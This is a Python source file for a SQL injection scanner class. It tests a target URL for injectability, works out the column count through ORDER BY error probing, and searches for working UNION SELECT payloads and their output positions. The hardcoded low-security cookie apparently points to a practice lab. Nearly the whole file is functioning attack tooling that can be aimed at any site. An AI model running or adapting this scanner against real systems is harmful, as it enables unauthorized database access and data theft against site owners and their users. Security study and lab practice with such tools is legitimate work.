# -*- coding: UTF-8 -*-
from difflib import SequenceMatcher
import requests
import sys
from urllib import parse
import re
import aiohttp
from colorama import Fore, Style, Back


class ScanUnion():

	def __init__(self,url,method = "GET",file = "sql_injection/payload/header.txt"):
		self.url = url
		self.field_count = 0
		self.ifInjection = False
		self.headers =  {
		'User-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8',
		'Accept-Language': 'Zh-CN, zh;q=0.8, en-gb;q=0.8, en-us;q=0.8',
		'Accept-Encoding': 'identity',
		'Keep-Alive': '300',
		'Connection': 'keep-alive',
		'Cache-Control': 'max-age=0',
		}
		self.method = method
		self.pre_dict = []
		self.filed_num = 50
		self.stuffix = ["#","-- "]
		self.size = 10
		self.cookie = {"PHPSESSID":"l4d5vimt214shhrop6etsr22k4","security":"low"}
		self.data = {}
		self.postHeaders = {}
		self.header_file = file

	def get_ratio(self,payload,res_text):
		seqm = SequenceMatcher()
		text = self.get_page(payload)
		seqm.set_seq1(text)
		seqm.set_seq2(res_text)
		return seqm.ratio()

	def get_page(self,payload):
		if self.method == "GET":
			payload = parse.quote(payload.encode("utf-8"))
			url = self.url.replace("*",payload)
			text = requests.get(url,headers = self.headers,cookies = self.cookie).content
			return text.decode("utf-8")
		else:
			self.prepare_post(payload)
			text = requests.post(self.url,headers = self.postHeaders,data = self.data).content
			return text.decode("utf-8")

	def make_payload(self,payload):
		if self.method == "GET":
			for stuffix in self.stuffix:
				for pre in self.pre_dict:
					and_position = pre.index("an")
					result = str(pre[:and_position]) + payload + stuffix + pre[and_position:]
					yield result,pre
		else:
			for stuffix in self.stuffix:
				for pre_ in self.pre_dict:
					result = pre_ + payload + stuffix
					yield result,pre_

	
	def prepare_post(self,payload):
		with open(self.header_file,"r") as f:
			for i in f:
				if not self.postHeaders:
					if ":" in i.strip("\n"):
						temp = i.strip("\n").split(":")
						self.postHeaders[temp[0]] = temp[1].strip(" ")
					if "&" in i.strip("\n"):
						temp = i.strip("\n").split("&")
						for data_ in temp:
							data1 = data_.split("=")
							if "*" in data1:
								self.data[data1[0]] = payload
							else:
								self.data[data1[0]] = data1[1].strip(" ")
				else:
					if ":" in i.strip("\n"):
						temp = i.strip("\n").split(":")
						self.postHeaders[temp[0]] = temp[1].strip(" ")
					if "&" in i.strip("\n"):
						temp = i.strip("\n").split("&")
						for data_ in temp:
							data1 = data_.split("=")
							if "*" in data1:
								self.data[data1[0]] = payload
							else:
								self.data[data1[0]] = data1[1].strip(" ")

	def check_if_can_inject(self):
		sys.stdout.write(Fore.LIGHTGREEN_EX + "[~]checking whether can be injected......\n")
		with open("sql_injection/payload/payload1.txt","r") as f:
			for i in f:
				false_payload = i.strip("\n")
				true_payload = false_payload.replace('8','6')
				false_page = self.get_page(false_payload)
				if "You have an error in your SQL syntax" in false_page:
					continue
				ratio = self.get_ratio(true_payload,false_page)
				#print(ratio,true_payload,sep = " => ")
				if ratio <0.994:
					self.pre_dict.append(true_payload.replace("1","0"))
			#print(self.pre_dict)
			if self.pre_dict:
				sys.stdout.write(Fore.LIGHTGREEN_EX + "[*]it can be injected\n")
				return True
			else:
				sys.stdout.write(Fore.LIGHTRED_EX + "[-]it can't be injected\n")
				return False					

	def padding(self,str_):
		return str_ + "*" * (self.size-len(str_))

	def get_field_num(self):

		with open("sql_injection/payload/order.txt","r") as f:
			for order in f:
				start = 0
				filed_num = 50
				temp_num = 0
				count =  100 # 避免无限循环
				flag = 1000
				while True:
					payload_ = order.strip("\n") + " " + "{}".format(filed_num)
					for payload,pre in self.make_payload(payload_):
						#print(payload)
						page = self.get_page(payload)
						if "Unknown column '{}' in 'order clause'".format(filed_num) in page:
							self.pre_dict.clear()
							self.pre_dict.append(pre)
							flag -= 1
							temp_num = filed_num
							filed_num = int((start + filed_num) / 2)
							break
						elif "You have an error in your SQL syntax" in page:
							count -= 1
							continue
						elif flag == 1000:
							continue
						else:
							start = filed_num
							filed_num = int((start  + temp_num) / 2)
							count -= 1
						if start != temp_num - 1:
							break
						else:
							sys.stdout.write(Fore.LIGHTGREEN_EX + "[*]order sentence is {}\n".format(order.strip("\n")))
							return filed_num
					if count == 0:
						break
			return False

	def union_inject(self):
		if self.method == "GET":
			if not self.check_if_can_inject():
				sys.exit(0)
		else:
			self.pre_dict = ["' ",'" ',"') "," ","')) ",")' ","))' ",'") ','")) ',')" ','))" ']
		result = ""
		union_payload = []
		filed_num = self.get_field_num()
		if filed_num:
			sys.stdout.write(Fore.LIGHTGREEN_EX + "[*]The column number is {}\n".format(filed_num))
			sys.stdout.write(Fore.LIGHTGREEN_EX + "[~]strat getting inject position......\n")
			for i in range(1,filed_num+1):
				result += "'{}'".format("000" + self.padding(str(i)) + "000")+ ","
			union_payload.append(result[:-1])
			result = ""
			for i in range(1,filed_num+1):
				result += "(SelEct('{}'))".format("000" + self.padding(str(i)) + "000")+ 'a'*i + " join "
			union_payload.append(result[:-5])
			for pyload in union_payload:
				with open("sql_injection/payload/union.txt","r") as f:
					for union in f:
						payload_ = union.strip("\n") + pyload
						for payload,pre in self.make_payload(payload_):
							position_set = set()
							page = self.get_page(payload)
							if "You have an error in your SQL syntax" in page:
								continue
							str2 = re.findall("000([0-9*]{10})000",page)
							if str2:
								sys.stdout.write(Fore.LIGHTGREEN_EX + "[*]available payload: {}\n".format(payload))
								for position in str2:
									if not position in position_set:
										position_set.add(position)
						if position_set:
							while position_set:
								sys.stdout.write(Fore.LIGHTGREEN_EX + "[*]position {} can be injected\n".format(position_set.pop().split("*")[0]))
							sys.exit(0)
						else:
							continue
		else:
			sys.stdout.write(Fore.LIGHTRED_EX + "[-]can't get field num\n")
			sys.exit(0)
